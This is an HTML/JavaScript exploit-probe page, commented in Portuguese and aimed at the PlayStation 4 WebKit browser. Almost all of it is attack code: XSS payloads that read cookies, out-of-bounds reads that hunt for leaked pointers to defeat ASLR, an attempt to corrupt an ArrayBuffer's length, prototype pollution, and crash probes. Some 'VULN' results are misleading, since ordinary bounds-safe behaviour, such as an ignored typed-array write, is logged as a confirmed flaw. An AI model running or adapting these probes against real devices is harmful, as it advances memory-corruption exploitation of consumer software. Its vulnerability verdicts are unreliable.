<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 WebKit PoC - Focused Probes v5</title>
    <style>
        /* Estilos CSS (mantidos) */
        body { background: #111; color: #eee; font-family: monospace; padding: 15px; font-size: 12px; }
        #user-agent-info { background: #333; color: #0f0; padding: 5px; margin-bottom: 10px; white-space: pre-wrap; }
        #poc-output { background: #222; border: 1px solid #444; padding: 10px; height: 75vh; overflow-y: auto; white-space: pre-wrap; margin-top: 10px; }
        .log-info { color: #6cf; }
        .log-test { color: #fff; font-weight: bold; margin-top: 10px; display: block; border-top: 1px dashed #555; padding-top: 5px; }
        .log-subtest { color: #eee; font-weight: bold; margin-left: 10px; }
        .log-vuln { color: #ff4444; font-weight: bold; }
        .log-leak { color: #FF9800; font-weight: bold; }
        .log-ptr { color: #f0f; font-weight: bold; } /* Magenta para leaks que PARECEM ponteiros */
        .log-good { color: #4CAF50; }
        .log-warn { color: #FFC107; }
        .log-error { color: #f44336; }
        .log-crash { color: #f0f; font-weight: bold; }
        .xss-box { border: 2px dotted red; padding: 5px; margin: 5px; color: yellow; }
    </style>
</head>
<body>
    <h1>PS4 WebKit PoC - Focused Probes v5</h1>
    <p>Foco: Refinar Info Leak (ASLR Bypass) e Corrupção de Length.</p>
    <div id="user-agent-info">Recuperando User Agent...</div>
    <div id="controls">
        </div>
    <div id="poc-output"></div>
    <div id="xss-target-div" style="margin-top:10px; border: 1px dashed #555; padding: 10px;">Área para teste de XSS DOM.</div>

    <script>
        let outputDiv = document.getElementById('poc-output');
        const log = (message, type = 'info') => { /* Função log igual anterior */ if(!outputDiv)return;try{const t=`[${new Date().toLocaleTimeString()}]`;const s=String(message).replace(/</g,"&lt;").replace(/>/g,"&gt;");if(outputDiv.innerHTML.length>500000){outputDiv.innerHTML=outputDiv.innerHTML.substring(outputDiv.innerHTML.length-250000);outputDiv.innerHTML=`<span>[Log Truncado...]</span>\n`+outputDiv.innerHTML;}outputDiv.innerHTML+=`<span class="log-${type}">${t} ${s}\n</span>`;outputDiv.scrollTop=outputDiv.scrollHeight;}catch(e){console.error("Erro log:",e);outputDiv=null;}};
        const PAUSE_DURATION = 300;
        const SHORT_PAUSE = 50;

        // --- Funções Auxiliares ---
        const isPotentialPointer = (high, low) => { /* Função isPotentialPointer simplificada */
            if(high===0&&low===0)return false;
            // Simplificado: Considera ponteiro se não for um valor muito pequeno
            // Aumenta chance de falsos positivos, mas reduz chance de perder um leak real.
            return high > 0 || low >= 0x10000;
        };

        // --- Coleta de User Agent (igual v4) ---
        const displayUserAgent = () => { /* ... código igual ao v4 ... */ const ua=navigator.userAgent||"N/A";const d=document.getElementById('user-agent-info');if(d){d.textContent=`User Agent: ${ua}`;}log(`User Agent: ${ua}`,'info');const wm=ua.match(/AppleWebKit\/([0-9.]+)/);if(wm&&wm[1]){log(`Versão WebKit (aprox): ${wm[1]}`,'info');}const pm=ua.match(/(PlayStation 4|PLAYSTATION 4)\/([0-9.]+)/);if(pm&&pm[2]){log(`Versão Firmware PS4 (UA): ${pm[2]}`,'info');}};

        // --- Teste 1: XSS (Mantido - Sucesso Confirmado) ---
        const demonstrateXSS_Alert=()=>{log("XSS Alert...","warn");try{alert('XSS Alert!');}catch(e){log(`Alerta bloq: ${e.message}`,'good');}};const demonstrateXSS_DOM=()=>{log("XSS DOM...","warn");try{const t=document.getElementById('xss-target-div');if(t){t.innerHTML='<h2 class="log-vuln">XSS DOM!</h2><img src=x onerror=alert("XSS DOM ONERROR")>';log("DOM Manip OK.",'vuln');}else{log("Alvo DOM ñ enc.","error");}}catch(e){log(`Erro XSS DOM: ${e.message}`,'error');}};const demonstrateXSS_Cookie=()=>{log("XSS Cookie...","warn");try{const c=document.cookie;log(`Cookie: '${c}'`,c?'vuln':'info');}catch(e){log(`Erro Cookie: ${e.message}`,'warn');}};
        const runCSP_XSS = () => { log("--- T1: CSP Bypass + XSS ---",'test'); try{const pL=`log("[PD] Exec...","warn");try{alert('XSS DataURI');}catch(e){log("[PD] Bloq.","good");}`;const eP=btoa(pL);const s=document.createElement('script');s.src='data:text/javascript;base64,'+eP;s.onerror=()=>{log("ERRO data:!","error");};document.body.appendChild(s);log("Script data: add.",'info');}catch(e){log(`Erro data:: ${e.message}`,'warn');} try{const i=document.createElement('img');i.src='x';i.setAttribute('onerror',"log('onerror!','info');demonstrateXSS_DOM();");document.body.appendChild(i);log("Img onerror add.",'info');}catch(e){log(`Erro onerror: ${e.message}`,'warn');} try{const a=document.createElement('a');a.href="javascript:log('Link JS!','warn');demonstrateXSS_Cookie();";a.textContent="[Clique Teste JS URI]";a.style.cssText='display:block;margin:5px;color:orange;border:1px solid orange;padding:3px;';const h=document.getElementById('js-link-placeholder');if(h)h.replaceWith(a);else document.getElementById('controls').appendChild(a);log("Link JS URI add.",'warn');}catch(e){log(`Erro link JS: ${e.message}`,'warn');} log("--- T1 Concluído ---",'test'); };


        // --- NOVO Teste 2: Info Leak Refined v5 ---
        const runInfoLeakRefined_v5 = async () => {
            log("--- T2: Info Leak Refined v5 ---", 'test');
            log("Foco: Ler OOB relativo à escrita, Usar Vítima, Heurística Pointer Simples.", 'warn');

            const bufferSize = 64;
            const oobWriteOffsets = [-16, -8, -1]; // Offsets de escrita OOB (rel ao fim do buffer)
            const victimFactories = { // Tipos de vítima
                "ArrayBuffer": () => new ArrayBuffer(128),
                "Float64Array": () => new Float64Array(32),
                "Object": () => ({ a: 1, b: "test", c: null, d: 1.23 })
            };

            for (const victimName in victimFactories) {
                for (const writeOffset of oobWriteOffsets) {
                    log(`Testando: Escrita @${writeOffset}, Vítima: ${victimName}`, 'subtest');
                    let victimObj = null;
                    let attackerBuffer = null;
                    let u8view = null;
                    let dataView = null;
                    let potentialLeakFound = false;

                    try {
                        victimObj = victimFactories[victimName]();
                        attackerBuffer = new ArrayBuffer(bufferSize);
                        u8view = new Uint8Array(attackerBuffer);
                        dataView = new DataView(attackerBuffer);
                        log(`  Atacante (Buffer ${bufferSize}B) e Vítima (${victimName}) alocados.`, 'info');

                        // Realizar escrita OOB
                        const writeValue = 0xBB + Math.abs(writeOffset); // Valor diferente p/ cada offset
                        const absoluteWriteAddr = attackerBuffer.byteLength + writeOffset;
                        try {
                            // Escrever 1 byte OOB
                            dataView.setUint8(absoluteWriteAddr, writeValue);
                            log(`  Escrita OOB @offset ${writeOffset} (addr ${absoluteWriteAddr}) com ${writeValue} realizada.`, 'good');
                        } catch (e) {
                            log(`  Escrita OOB @offset ${writeOffset} falhou: ${e.message}`, 'error');
                            continue; // Pular para próximo teste se escrita falhar
                        }
                        await new Promise(r => setTimeout(r, SHORT_PAUSE));

                        // Ler OOB em offsets RELATIVOS ao ponto de escrita
                        const readOffsetsRelative = [-16, -8, 0, 8, 16]; // Bytes relativos a 'absoluteWriteAddr'
                        log(`  Lendo OOB em offsets relativos à escrita: ${readOffsetsRelative.join(', ')}`, 'info');
                        for (const relativeOffset of readOffsetsRelative) {
                            const absoluteReadAddr = absoluteWriteAddr + relativeOffset;
                            try { // Ler U64
                                const low = dataView.getUint32(absoluteReadAddr, true);
                                const high = dataView.getUint32(absoluteReadAddr + 4, true);
                                if (low !== 0 || high !== 0) {
                                    const ptrLike = isPotentialPointer(high, low);
                                    log(`    Leak U64 @Write${writeOffset}+${relativeOffset}: H=${high.toString(16).padStart(8,'0')} L=${low.toString(16).padStart(8,'0')}`, ptrLike ? 'ptr' : 'leak');
                                    if (ptrLike) {
                                         log(`      >> POTENCIAL PONTEIRO ENCONTRADO! <<`, 'vuln'); potentialLeakFound = true;
                                    }
                                }
                            } catch (e) { /* Silenciar erros esperados */ }
                        } // Fim loop leitura OOB

                        // Tentar USAR o objeto vítima após a escrita OOB (pode crashar ou vazar)
                        if (victimObj) {
                            log(`  Tentando usar objeto Vítima (${victimName}) após OOB write...`, 'warn');
                            try {
                                if (victimObj instanceof ArrayBuffer || ArrayBuffer.isView(victimObj)) {
                                    const len = victimObj.byteLength !== undefined ? victimObj.byteLength : victimObj.length;
                                    log(`    Vítima.length/byteLength = ${len}`, 'info');
                                    // Tentar acessar um elemento (se for view/array)
                                    if (len > 0 && victimObj[0] !== undefined) log(`    Vítima[0] = ${victimObj[0]}`, 'info');
                                } else if (typeof victimObj === 'object') {
                                    // Tentar converter para string ou acessar prop
                                    log(`    Vítima.toString() = ${victimObj.toString()}`, 'info');
                                    if(victimObj.a !== undefined) log(`    Vítima.a = ${victimObj.a}`, 'info');
                                }
                            } catch (e) {
                                log(`    ERRO ao usar Vítima após OOB Write (POTENCIAL EFEITO?): ${e.message}`, 'leak');
                                potentialLeakFound = true; // Considerar um erro aqui como um leak potencial
                            }
                        }

                    } catch (e) {
                        log(`  Erro GERAL durante teste (Vítima ${victimName}, Escrita @${writeOffset}): ${e.message}`, 'error');
                    } finally { victimObj = null; attackerBuffer = null; u8view = null; dataView = null; } // GC help

                    if (potentialLeakFound) log(`  >>> Potenciais leaks/efeitos encontrados com escrita @${writeOffset} perto de ${victimName}! <<<`, 'vuln');
                    await new Promise(r => setTimeout(r, SHORT_PAUSE));
                } // Fim loop escrita OOB
                 await new Promise(r => setTimeout(r, PAUSE_DURATION));
            } // Fim loop tipos de vítima
            log("--- T2 Concluído ---", 'test');
        };


        // --- NOVO Teste 3: Length Corruption Probing v5 ---
        const runLengthCorruptionProbing_v5 = async () => {
            log("--- T3: Length Corruption Probing v5 ---", 'test');
            log("Foco: Tentar múltiplos offsets OOB para corromper byteLength.", 'warn');

            const bufferSize = 128;
            const possibleLengthOffsets = [bufferSize - 16, bufferSize - 8, bufferSize - 4, bufferSize]; // Offsets OOB a testar, relativos ao início do atacante
            const newLengthLow = 0xFFFFFFF8; // Tentar um valor alinhado a 8?
            const newLengthHigh = 0x0FFFFFFF;

            for (const lengthWriteOffset of possibleLengthOffsets) {
                 log(`Testando corrupção de length via OOB @offset ${lengthWriteOffset}`, 'subtest');
                 let attackerBuffer = null, victimBuffer = null, attackDataView = null, victimDataView = null, victimView = null;
                 let success = false;
                 try {
                     attackerBuffer = new ArrayBuffer(bufferSize);
                     victimBuffer = new ArrayBuffer(bufferSize); // Vítima
                     attackDataView = new DataView(attackerBuffer);
                     victimDataView = new DataView(victimBuffer);
                     victimView = new Uint8Array(victimBuffer);
                     const originalVictimLength = victimBuffer.byteLength;
                     log(`  Buffers alocados. Tam. original vítima: ${originalVictimLength}. Tentando escrita OOB...`, 'info');

                     // Tentar escrever novo tamanho
                     attackDataView.setUint32(lengthWriteOffset, newLengthLow, true);
                     attackDataView.setUint32(lengthWriteOffset + 4, newLengthHigh, true);
                     log(`  Escrita OOB @${lengthWriteOffset} realizada. Verificando tamanho...`, 'good');

                     // Verificar se tamanho mudou
                     const currentVictimLength = victimBuffer.byteLength;
                     log(`  Tamanho ATUAL da vítima: ${currentVictimLength}`, (currentVictimLength !== originalVictimLength) ? 'vuln' : 'info');

                     if (currentVictimLength !== originalVictimLength && currentVictimLength > bufferSize) {
                         log("    >> SUCESSO! Tamanho da Vítima Corrompido! <<", 'vuln');
                         success = true;
                         // Tentar ler OOB da VÍTIMA
                         const victimReadOffset = originalVictimLength + Math.floor(Math.random() * 32); // Ler um pouco além
                         try {
                             log(`    Tentando ler OOB da VÍTIMA @${victimReadOffset}...`, 'info');
                             const leakedU64Low = victimDataView.getUint32(victimReadOffset, true);
                             const leakedU64High = victimDataView.getUint32(victimReadOffset + 4, true);
                             const ptrLike = isPotentialPointer(leakedU64High, leakedU64Low);
                             log(`    Leitura OOB Vítima (U64): H=${leakedU64High.toString(16)} L=${leakedU64Low.toString(16)}`, ptrLike ? 'ptr' : 'leak');
                             if(ptrLike) log(`      >> POTENCIAL PONTEIRO VAZADO DA VÍTIMA! <<`, 'vuln');
                         } catch (e) { log(`    Leitura OOB da Vítima falhou: ${e.message}`, 'warn'); }
                     } else {
                         log("    Falha: Tamanho da vítima não mudou ou não aumentou.", 'warn');
                     }
                 } catch (e) {
                     log(`  Erro no teste com offset ${lengthWriteOffset}: ${e.message}`, 'error');
                 } finally { attackerBuffer = null; victimBuffer = null; } // GC help

                 if(success) break; // Parar se um offset funcionou
                 await new Promise(r => setTimeout(r, SHORT_PAUSE));
            } // Fim loop offsets

            log("--- T3 Concluído ---", 'test');
        };

        // --- Teste 4: OOB Write Confirm (Mantido - Sucesso Confirmado) ---
        const runOOBTestU8_Confirm = async () => { /* ... código igual ao v4 ... */ log("--- T4: OOB Write (Confirmação) ---",'test'); try{const bS=32; const b=new ArrayBuffer(bS); const v=new Uint8Array(b); const wV=0xEE; const wO=[-1,bS,bS+10]; for(const o of wO){ log(`Tentar OOB U8 @${o}...`,'subtest'); try{v[o]=wV;log(`VULN: OOB U8 @${o} OK!`,'vuln');}catch(e){log(`✅ OOB U8 @${o} Bloq: ${e.message}`,'good');} await new Promise(r=>setTimeout(r,SHORT_PAUSE));}}catch(e){log(`Erro T4: ${e.message}`,'error');} log("--- T4 Concluído ---",'test'); };

        // --- Teste 5: PP Basic Confirm (Revertido para v1 - Sucesso Confirmado) ---
        const runPPBasic_Confirm = () => {
             log("--- T5: PP Básico (Confirmação) ---", 'test');
             const k='__pp_test_confirm__', v='PPOK_v5';
             try {
                 log(`Poluindo Object.prototype['${k}'] com '${v}'...`, 'info');
                 Object.prototype[k] = v; // Poluir
                 const targets = {'window': window, 'novoObj': {}, 'array': []};
                 let confirmedCount = 0;
                 for (const name in targets) {
                     try {
                         if (targets[name] && targets[name][k] === v) {
                             log(`VULN: PP básica OK! Objeto '${name}' herdou a propriedade.`, 'vuln');
                             confirmedCount++;
                         } else {
                              log(`INFO: Objeto '${name}' não herdou ou acesso falhou.`, 'info');
                         }
                     } catch (e) { log(`WARN: Erro ao verificar PP em '${name}': ${e.message}`, 'warn'); }
                 }
                 if (confirmedCount > 0) log(`Confirmado em ${confirmedCount} objetos. Vulnerabilidade PP básica presente.`, 'vuln');
                 else log(`AVISO: Não foi possível confirmar herança PP nos objetos testados.`, 'warn');

                 // Limpar
                 delete Object.prototype[k];
                 log("Propriedade PP limpa.", 'info');
             } catch (e) { log(`Erro GERAL no teste PP Básico: ${e.message}`, 'error'); }
             log("--- T5 Concluído ---", 'test');
        };

        // --- Teste 6: Crash Probes (Mantido - Opcional) ---
        const runCrashProbes = async () => { /* ... código igual ao v4 ... */ log("--- T6: Crash Probes (Pode Travar!) ---",'test'); log("AVISO: Tentará causar travamentos.",'warn'); const cT=async(d,f)=>{ log(`Crash Probe: ${d}...`,'subtest'); try{ await f(); log("Probe Ñ crashou.",'info'); } catch(e){ log(`Probe gerou erro JS: ${e.message}`,'warn'); } await new Promise(r=>setTimeout(r,SHORT_PAUSE)); }; await cT("OOB Write 41s",async()=>{ const b=new ArrayBuffer(16);const d=new DataView(b);const o=32; try{log(`  Write 41s OOB@${o}`,'crash');d.setUint32(o,0x41414141,true);d.setUint32(o+4,0x41414141,true);} catch(e){log(` Err W: ${e.message}`,'good');throw e;}}); await cT("OOB Read High",async()=>{ const b=new ArrayBuffer(16);const d=new DataView(b);const o=0x7FFFFFFF; try{log(`  Read U32 OOB@${o}`,'crash');const v=d.getUint32(o,true);log(` Read=${v}`,'info');} catch(e){log(` Err R: ${e.message}`,'good');throw e;}}); log("--- T6 Concluído ---",'test'); };


        // --- Função Principal ---
        const runAll = async () => {
             displayUserAgent(); // Exibir logo
             if (document.getElementById('runAllBtn')) document.getElementById('runAllBtn').disabled = true;
            log("Iniciando todos os testes (FOCUSED PROBES v5)...");
            const tests = [
                runCSP_XSS,                     // T1: XSS Base (OK)
                runInfoLeakRefined_v5,          // T2: Info Leak Refined (NOVO)
                runLengthCorruptionProbing_v5,  // T3: Length Corruption Probe (NOVO)
                runOOBTestU8_Confirm,           // T4: OOB Confirm (OK)
                runPPBasic_Confirm,             // T5: PP Basic Confirm (OK)
                runCrashProbes                  // T6: Crash Probes (Opcional)
            ];
             for(let i=0; i < tests.length; i++){ /* ... loop igual ao v4 ... */ if(!outputDiv){console.error("Output NULO");break;} try{ log(`--- EXECUTANDO TESTE ${i+1}/${tests.length}: ${tests[i].name} ---`,'test'); const fn=tests[i];const res=fn(); if(res instanceof Promise){await res;} }catch(e){log(`ERRO TESTE ${i+1}: ${e.message} ${e.stack}`,'error');} if(i<tests.length-1&&outputDiv){log(`Pausa ${PAUSE_DURATION}ms...`,'info');await new Promise(r=>setTimeout(r,PAUSE_DURATION));} }
            if(outputDiv) log("\n\nTodos os testes FOCUSED PROBES v5 concluídos.", 'test');
            else console.error("Script concluído, div log NULO.");
             if (document.getElementById('runAllBtn')) document.getElementById('runAllBtn').disabled = false;
        };

        // Adicionar controles manuais atualizados
        document.getElementById('controls').innerHTML = `
            <button onclick="runCSP_XSS()">Rodar T1 (XSS)</button>
            <button onclick="runInfoLeakRefined_v5()">Rodar T2 (Leak v5)</button>
            <button onclick="runLengthCorruptionProbing_v5()">Rodar T3 (Length Corr v5)</button>
            <button onclick="runOOBTestU8_Confirm()">Rodar T4 (OOB Confirm)</button>
            <button onclick="runPPBasic_Confirm()">Rodar T5 (PP Basic)</button>
            <button onclick="runCrashProbes()">Rodar T6 (Crash Probes)</button>
            <button id="runAllBtn" onclick="runAll()">Rodar Todos (Auto)</button>
            <br>
            <span style="margin-left: 5px;">Teste JS Link (T1): </span>
            <a id="js-link-placeholder" href="#" style="color:orange">[Link JS URI]</a>
        `;

        displayUserAgent(); // Chamar de novo caso algo tenha falhado antes
        // Opcional: Rodar tudo automaticamente ao carregar?
        // document.addEventListener('DOMContentLoaded', runAll);
    </script>

</body>
</html>
